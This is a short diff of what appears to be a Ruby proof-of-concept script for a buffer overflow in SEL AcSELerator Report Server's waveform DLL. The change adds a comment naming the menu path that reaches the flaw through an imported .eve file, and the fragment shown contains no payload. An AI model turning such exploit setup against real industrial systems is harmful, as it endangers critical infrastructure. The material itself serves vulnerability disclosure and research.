@@ -1,7 +1,8 @@
 #!/usr/bin/env ruby
 # AcSELerator Report Server (2.41.1.0) contains a
 # buffer overflow in SEL Event Waveform (1.04.0003) -> ReadER32.dll (1.7.6.0).
-
+# ... the exploitable code can be reached from the main application by 
+# importing a .eve file via: Admin->Databases->Add External Event Report...
 require 'rex'
 
 fd = File.open("template.eve", "rb" )
